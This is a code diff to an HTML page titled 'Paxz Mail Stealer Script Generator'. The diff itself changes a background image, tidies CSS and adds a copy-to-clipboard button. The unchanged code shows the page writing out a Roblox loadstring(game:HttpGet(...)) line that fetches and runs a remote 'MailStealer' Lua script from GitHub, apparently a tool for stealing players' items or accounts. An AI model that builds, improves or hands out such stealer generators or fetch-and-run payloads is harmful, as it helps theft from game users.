@@ -5,7 +5,7 @@
     <title>Paxz Mail Stealer Script Generator</title>
     <style>
       body {
-        background-image: url("https://images.hdqwalls.com/download/moon-fox-galaxy-4k-79-1920x1080.jpg");
+        background-image: url("https://4kwallpapers.com/images/wallpapers/galaxy-milky-way-stars-deep-space-colorful-astronomy-nebula-2880x1800-5366.jpg");
         background-size: cover;
         background-repeat: no-repeat;
       }
@@ -31,9 +31,6 @@
       
       #output {
         margin-top: 10px;
-      }
-
-      #output {
         width: 800px;
       }
     </style>
@@ -50,6 +47,7 @@
       <label for="output">Script Output:</label><br>
       <textarea id="output" rows="10" cols="50"></textarea><br>
       <input type="button" value="Generate Script" onclick="generateScript();">
+      <input type="button" value="Copy to Clipboard" onclick="copyToClipboard();">
     </form>
 
     <script>
@@ -64,6 +62,12 @@
         script += 'loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua"))()';
 
         document.getElementById("output").value = script;
+      }
+
+      function copyToClipboard() {
+        var output = document.getElementById("output");
+        output.select();
+        document.execCommand("copy");
       }
     </script>
   </body>
